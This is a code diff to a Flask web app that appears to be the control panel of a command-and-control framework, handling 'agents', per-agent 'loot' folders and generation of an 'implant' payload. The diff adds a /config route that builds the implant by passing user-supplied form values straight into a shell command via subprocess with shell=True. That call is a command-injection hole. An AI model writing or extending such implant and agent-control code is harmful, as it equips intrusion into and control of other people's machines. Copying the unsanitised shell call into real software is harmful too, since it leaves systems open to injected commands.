@@ -7,6 +7,7 @@ from config import BaseConfig
 import time
 import os
 import json
+import subprocess
 
 from models import *
 
@@ -29,18 +30,8 @@ def login_required(f):
     return wrap
 
 
-def build_implant():
-    config = {}
-    config['ip'] = requests.get("https://api.ipify.org").text
-    config = json.dumps(config).encode("utf-8")
-
-    with open('implant/payloads/implant', 'rb') as binFile:
-        byteData = bytearray(binFile.read())
-    offset = byteData.find(b'{"ip"')
-
-    with open('implant/payloads/implant', 'r+b') as binFile:
-        binFile.seek(offset)
-        binFile.write(config)
+def build_implant(ip="127.0.0.1", sleepTime="0"):
+    subprocess.Popen([f"implant/payloads/make.sh -h {ip} -s {sleepTime}"], shell=True)
 
 
 def add_agent(agent_dict):
@@ -53,11 +44,21 @@ def add_agent(agent_dict):
         db.session.flush()
         agent_id = agent.id
         print(agent_id)
-        # db.session.add(CommandQueue(agent_id, 'ls', 'asd'))
         db.session.commit()
         print(agent_id)
         os.mkdir(f"loot/agent_{agent_id}")
         return agent.id
+
+
+@app.route('/config', methods=['GET', 'POST'])
+@login_required
+def generate():
+    if request.method == 'POST':
+        args = [request.form[key] for key in request.form.keys() if request.form[key] != '']
+        print(args)
+        build_implant(*args)
+        flash("Payload successfuly generated!")
+    return render_template("config.html")
 
 
 @app.route('/bots', methods=['GET'])
